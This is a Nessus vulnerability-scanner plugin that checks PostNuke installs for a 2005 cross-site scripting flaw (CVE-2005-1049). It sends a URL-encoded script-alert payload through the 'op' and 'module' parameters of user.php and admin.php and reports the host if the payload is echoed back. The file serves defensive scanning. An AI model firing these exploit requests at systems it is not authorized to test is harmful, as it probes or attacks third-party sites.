#
# (C) Tenable Network Security
#


if (description) {
  script_id(18006);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-1049");
  script_bugtraq_id(13075, 13076);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"15369");
    script_xref(name:"OSVDB", value:"15370");
  }

  name["english"] = "PostNuke op and module Parameters Cross-Site Scripting Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to cross-
site scripting attacks. 

Description :

The version of PostNuke installed on the remote host fails to properly
sanitize user input through the 'op' parameter of the 'user.php'
script and the 'module' parameter of the 'admin.php' script before
using it in dynamically generated content.  An attacker can exploit
this flaw to inject arbitrary HTML and script code into the browser of
unsuspecting users, leading to disclosure of session cookies and the
like. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2005-04/0112.html
http://community.postnuke.com/Article2679.htm

Solution : 

Upgrade to version 0.760 RC4 or later.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:H/Au:NR/C:N/A:N/I:P/B:N)";
  script_description(english:desc["english"]);

  summary["english"] = "Checks for op and module parameters cross-site scripting vulnerabilities in PostNuke";
  script_summary(english:summary["english"]);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("cross_site_scripting.nasl", "postnuke_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/" + port + "/generic_xss")) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/postnuke"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaws.
  # - A simple alert to display "Nessus was here".
  xss = "<script>alert('Nessus was here');</script>";
  #   nb: the url-encoded version is what we need to pass in.
  exss = "%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E";
  exploits = make_list(
    "/admin.php?module=%22%3E" + exss + "&op=main&POSTNUKESID=355776cfb622466924a7096d4471a480",
    "/user.php?op=%22%3E" + exss + "&module=NS-NewUser&POSTNUKESID=355776cfb622466924a7096d4471a480"
  );
  foreach exploit (exploits) {
    req = http_get(item:string(dir, exploit), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see our XSS.
    if (xss >< res) {
      security_note(port);
      exit(0);
    }
  }
}
